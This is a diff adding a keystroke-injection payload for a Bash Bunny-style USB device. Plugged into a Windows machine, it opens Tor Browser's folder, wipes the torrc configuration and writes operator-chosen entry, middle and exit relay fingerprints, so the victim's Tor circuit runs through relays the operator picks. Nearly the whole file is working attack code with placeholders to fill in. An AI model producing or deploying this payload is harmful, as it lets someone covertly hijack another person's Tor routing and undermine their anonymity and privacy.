@@ -1,0 +1,63 @@
+QUACK REM ################################################################
+QUACK REM #                                                              #
+QUACK REM # Title        : Set An Arbitrary And Persistent Tor Circuit   #
+QUACK REM # Author       : Aleff                                         #
+QUACK REM # Version      : 1.0                                           #
+QUACK REM # Category     : Execution                                     #
+QUACK REM # Target       : Windows 10/11                                 #
+QUACK REM #                                                              #
+QUACK REM ################################################################
+
+ATTACKMODE HID
+
+QUACK REM Requirements:
+QUACK REM - Tor installed
+QUACK REM - Fingerprints of your relays
+
+QUACK REM Note:
+QUACK REM - Payload tested using TorBrowser 13.0.8 based on Mozilla Firefoz 115.6.0esr ENG
+QUACK REM - Payload tested on Windows 11_eng;
+
+QUACK REM VARIABLES
+QUACK REM Set the Fingerprints #EntryNode #MiddleNode #ExitNode
+ENTRY_NODE='here'
+MIDDLE_NODE='here'
+EXIT_NODE='here'
+
+QUACK DELAY 1500
+QUACK REM Open the TorBrowser path
+QUACK GUI
+QUACK DELAY 500
+QUACK STRING tor browser
+QUACK ENTER
+QUACK RIGHTARROW
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK ENTER
+QUACK SHIFT F10
+QUACK DELAY 500
+QUACK DOWNARROW
+QUACK DOWNARROW
+QUACK ENTER
+QUACK REM Search and open the torrc config file
+QUACK CTRL f
+QUACK DELAY 500
+QUACK STRING torrc
+QUACK DELAY 1500
+QUACK DOWNARROW
+QUACK SPACE
+QUACK ENTER
+QUACK TAB
+QUACK ENTER
+QUACK REM Delete all the previous data with the arbotrary nodes
+QUACK CTRL a
+QUACK DELETE
+QUACK STRING EntryNodes $ENTRY_NODE
+QUACK ENTER
+QUACK STRING MiddleNodes $MIDDLE_NODE
+QUACK ENTER
+QUACK STRING ExitNodes $EXIT_NODE
+QUACK ENTER
+QUACK CTRL s
+QUACK ALT F4
+QUACK ALT F4
